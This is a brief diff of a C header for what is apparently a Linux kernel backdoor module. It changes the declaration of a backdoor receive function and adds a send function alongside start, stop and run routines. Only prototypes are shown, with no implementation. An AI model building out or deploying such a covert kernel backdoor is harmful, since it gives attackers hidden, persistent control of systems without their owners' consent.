@@ -18,7 +18,8 @@ struct kbackdoor_t {
   int running;
 };
 
-size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf, size_t len);
+ssize_t backdoor_recv(struct socket *sock, uint8_t *buf, size_t len);
+ssize_t backdoor_send(struct socket *sock, uint8_t *buf, size_t len);
 int backdoor_run(void *);
 int backdoor_start(void);
 int backdoor_stop(void);
